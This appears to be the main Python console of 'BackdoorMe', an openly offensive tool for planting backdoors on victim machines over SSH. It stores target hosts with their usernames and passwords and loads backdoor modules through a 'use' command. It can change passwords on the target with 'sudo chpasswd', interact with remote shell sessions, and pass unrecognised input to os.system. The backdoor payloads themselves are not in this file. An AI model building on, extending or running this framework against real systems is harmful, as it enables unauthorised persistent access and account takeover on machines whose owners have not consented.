import os
import socket
import subprocess
import target
import getpass
import rlcompleter
from colorama import *
from tkinter import *
import cmd
from start import ascii
from backdoors import *
from modules import *
import importlib
import inspect
import sys
import traceback
import netifaces as ni
from six.moves import input
import six

GOOD = Fore.GREEN + " + " + Fore.RESET
BAD = Fore.RED + " - " + Fore.RESET
WARN = Fore.YELLOW + " * " + Fore.RESET
INFO = Fore.BLUE + " + " + Fore.RESET
OPEN = Fore.GREEN + "open" + Fore.RESET
CLOSED = Fore.RED + "closed" + Fore.RESET

sys.path.append("backdoors")
sys.path.append("modules")

class BackdoorMe(cmd.Cmd):
    prompt = Fore.BLUE + ">> " + Fore.RESET

    def __init__(self):
        cmd.Cmd.__init__(self)
        self.enabled_modules = enabled_modules 
        self.target_num = 1
        self.port = 22 
        self.targets = {}
        self.curtarget = None
        self.get_local_ip()
        
        if six.PY3:
            self.localIP = str(self.localIP)
        else:
            self.localIP = self.localIP.encode('ascii', 'ignore').decode('ascii')

        self.ctrlc = False
        ascii()
        print("Welcome to BackdoorMe, a powerful backdooring utility. Type \"help\" to see the list of available commands.")
        print("Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target.")
        print("Using local IP of %s." % self.localIP)
        self.addtarget("127.0.0.1", "george", "password")
    
    def get_local_ip(self):
        interfaces = ni.interfaces()
        interface = ""
        for iface in interfaces:
            if ni.AF_INET in ni.ifaddresses(iface) and "lo" not in iface:
                interface = iface

        if interface != "":
            addrs = ni.ifaddresses(interface)
            ipinfo = addrs[socket.AF_INET][0]
            self.localIP = ipinfo['addr']


    def print_help(self, lst):
        it = iter(lst)
        for x in it:
            print("{0:<20} {1:<25}".format(x, next(it)))

    def do_help(self, args):
        print("Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target.")
        print("Using local IP of %s." % self.localIP)
        print("\nAvailable commands are: ")
        print("=======================")
        self.print_help(["addtarget", "adds a target", "change_ip <IP>", "changes local IP used by backdoors", "change_port <PORT>", "changes SSH port of current target", "close", "closes an existing SSH connection to target", "edittarget", "edit existing target", "history", "displays command history", "list", "lists currently loaded targets, available backdoors, and enabled modules.", "open", "opens an SSH connection to the target", "quit", "exits backdoorme", "set target <#>", "set the current target to given number", "use <BACKDOOR>", "loads given backdoor for exploit. Run \"list\" or \"list backdoors\" for a full list of available backdoors."])
        #cmd.Cmd.do_help(self, args)
    
    def addtarget(self, hostname, uname, pword):
        t = target.Target(hostname, uname, pword, self.target_num)
        self.targets[self.target_num] = t
        self.target_num += 1
        self.curtarget = t

    def get_target_info(self):
        hostname = input('Target Hostname: ') #victim host
        try:
            socket.inet_aton(hostname)
        except socket.error:
            print(BAD + "Invalid IP Address.")
            return None, None, None
        uname = input('Username: ')  # username for the box to be attacked
        pword = getpass.getpass()  # password for the box to be attacked
        return hostname, uname, pword
    
    def do_addtarget(self, args):
        hostname, uname, pword = self.get_target_info()
        if hostname is None:
            return
        print(GOOD + "Target %d Set!" % self.target_num)
        self.addtarget(hostname, uname, pword)
    
    def do_edittarget(self, args):
        t = self.get_target(args, connect=False)
        if t is None:
            return
        hostname, uname, pword = self.get_target_info() 
        t.hostname = hostname
        t.uname = uname
        t.pword = pword
        print(GOOD + "Target edited")

    def do_set(self, args):
        if len(args.split()) == 0 or args.split()[0] != "target":
            print(BAD + "Usage is \"set target <target-num>\"")
            return
        t = self.get_target(args, connect=False)
        if t is None:
            return
        self.curtarget = t
        print(GOOD + "Current target set to %s" % args.split()[-1])
    
    def open_conn(self,t):
        try: 
            t.conn()
        except:
            print(BAD + "Connection failed.")
            return
        print(GOOD + "Connection established.")

    def do_open(self, args):
        t = self.get_target(args)
        if t is None:
            return

    def do_close(self, args):
        t = self.get_target(args)
        if t is None:
            return
        try: 
            t.close()
        except:
            print(BAD + "Connection could not be closed.")
            return
        print(GOOD + "Connection closed.")

    def get_target(self, args, connect=True):
        t = self.curtarget
        if (len(args.split()) == 1 and not args.split()[-1].isdigit()) or len(args.split()) == 0:
            if self.curtarget is None:
                print(BAD + "No currently set target. Add a target with 'addtarget'.")
                return None
            else:
                print(GOOD + "Using current target %d." % t.target_num)
        elif not self.target_exists(int(args.split()[-1])):
            print(BAD + "No target with that target ID found." )
            return None
        else:
            print(GOOD + "Using target %s" % args.split()[-1])
            t = self.targets[int(args.split()[-1])]
        if not t.is_open and connect:
            print(BAD + "No SSH connection to target. Attempting to open a connection...")
            self.open_conn(t)
  
        return t

    def target_exists(self, num):
        return (num in self.targets)  
 
    def do_use(self, args):
        try:
            bd = args.split()[0]
            loc, bd =  bd.rsplit("/", 1)
            if "backdoors/" + loc not in sys.path: 
                sys.path.insert(0, "backdoors/" + loc)
            mod = importlib.import_module(bd)
            t = self.get_target(args)
            if t is None:
                return

            clsmembers = inspect.getmembers(sys.modules[bd], inspect.isclass)
            try:
                [m for m in clsmembers if m[1].__module__ == bd][0][1](self).cmdloop() 
            except Exception as e:
                print(BAD + "An unexpected error occured.")
                print(e)
                traceback.print_exc()
        except Exception as e:
            print(BAD + args + " backdoor cannot be found.")
            print(e)
            traceback.print_exc()

    def do_passwd(self, args):
        t = self.get_target(args)
        if t is None:
            return
        if not t.is_open:
            print(BAD + "No SSH connection to target. Run \"open\" to start a connection.")
            return
        username = input(" + Enter the username: ")
        password = input(" + Enter the new password: ")
        self.curtarget.ssh.exec_command("echo '%s:%s | sudo chpasswd" %(username, password))
        print("Changing %s to %s..." % (username, password)) 

    def do_change_ip(self, args):
        newIP = input("Please input the ip you want to use: ")
        try:
            socket.inet_aton(newIP)
            self.localIP = newIP
        except socket.error:
            print(BAD + "Invalid IP Address.")
            return 
        print(GOOD + "Local IP is now: " + newIP)

    def do_change_port(self, args):
        t = self.get_target(args)
        if t is None:
            return

        newPort = input("Please enter the port you want to use for future connections: ")
        t.port = newPort
        print(GOOD + "SSH Port for target is now: " + t.port)
        if input("Enter y if you'd like to restart the SSH connection with the new port now: ") == 'y':
            self.do_close(args)
            self.do_open(args)

    def do_quit(self, args):
        self.quit()

    def do_clear(self, args):
        os.system("clear")

    def walk(self, folder, echo=True, recursive=False):
        bds = []
        for root, dirs, files in os.walk(folder):
            bds += [d + "/" for d in dirs if "__" not in d]

            if "__" in root:  # ignore folders that start with __
                continue
            path = root.split('/')
            if echo and len([f for f in files if f[-3:] == ".py"]) > 0:  # Only show a folder if it has a python file in it
                print((((len(path) - 1) * 2 - 1)*' ') + INFO + path[-1]+"/")
            for f in files:
                if f[-3:] == ".py" and "util_" not in f:
                    name = str(f).replace(".py", "")
                    bds.append(root.replace("backdoors/", "") + "/" + name if recursive else name)
                    if echo:
                        print((len(path)*'  ') + "- " + str(f).replace(".py", ""))
            if not recursive:
                break

        return bds
    
    def do_sessions(self, args):
        if args == "" or args == "--help" or args == "-h":
            print("Use sessions -l to list and sessions -i <num> to interact with a shell")
        if args == "" or args == "--list" or args == "-l":
            i = 1
            for session in self.curtarget.sessions:
                print(str(i))
                print(session)
                i += 1
        if "-i" in args or "--interact" in args:
            self.curtarget.sessions[int(args.split(" ")[1]) - 1].interact()

        print(args)

    def get_categories(self):
        for root, dirs, files in os.walk("backdoors"):
            return [f for f in dirs if "__" not in f]

    def get_capabilities(self, category=None, recursive=False):
        caps = []
        if category is None:
            for cat in self.get_categories():
                caps += self.walk("backdoors/"+cat, echo=False, recursive=recursive)
            return caps
        else:
            return self.walk("backdoors/"+category, echo=False, recursive=recursive)

    def complete_use(self, text, line, begin_index, end_index):
        line = line.rsplit(" ")[1]
        segment = line.split("/")
        if len(segment) == 1:
            opts = self.walk("backdoors/", echo=False)
        else:
            opts = self.walk("backdoors/" + "/".join(segment[:-1]), echo=False)  
        opts = [o for o in opts if o.startswith(text)]
        if not opts:
            opts = self.walk("backdoors/" + "/".join(segment[:-1]), echo=False, recursive=True)
            return [o for o in opts if text in o]
        #print text
        #print [o for o in opts if o.startswith(text)]
        return opts 

    def do_list(self, args):
        if args == "targets" or len(args) == 0:
            print(GOOD + "Targets: ")
            for num, t in self.targets.items():
                print(" " + (WARN if (num == list(self.targets.values()).index(self.curtarget) + 1) else " * ") + "%s - %s %s:%s - %s" % (num, t.hostname, t.uname, t.pword, (OPEN if (t.is_open) else CLOSED)))
        if args == "modules" or len(args) == 0:
            print(GOOD + "Available modules: ")
            for num, mod in enumerate(sorted(self.enabled_modules.keys())):
                print("  * " + "%s" % (mod))
        if args == "backdoors" or len(args) == 0:
            print(GOOD+ "Available backdoors: ")
            for cat in self.get_categories():
                self.walk("backdoors/" + cat)
        if len(args) != 0 and args != "targets" and args != "backdoors" and args != "modules":
            print(BAD + "Unknown option " + args)

    def preloop(self):
        cmd.Cmd.preloop(self)   ## sets up command completion
        self._hist    = []      ## No history yet
        self._locals  = {}      ## Initialize execution namespace for user
        self._globals = {}

    def do_history(self, args):
        print(self._hist)

    def do_exit(self, args):
        self.quit()

    def precmd(self, line):
        self._hist += [ line.strip() ]
        self.ctrlc = False
        return line
        
    def default(self, line):       
        try:
            print(GOOD + "Executing \"" + line + "\"")
            os.system(line)
        except Exception as e:
            print(e.__class__, ":", e)

    def cmdloop(self, intro=None):
        try:
            cmd.Cmd.cmdloop(self)
        except KeyboardInterrupt:
            if not self.ctrlc: 
                self.ctrlc = True
                print("\n" + BAD + "Please run \"quit\" or \"exit\" to exit, or press Ctrl-C again.")
                self.cmdloop()
            else:
                print("")
                self.quit()

    def do_EOF(self, line):
        print("")
        return True

    def emptyline(self):
        return

    def quit(self):
        print(BAD + "Exiting...")
        exit()
        return


def main():
    BackdoorMe().cmdloop()


if __name__ == "__main__":
    main()
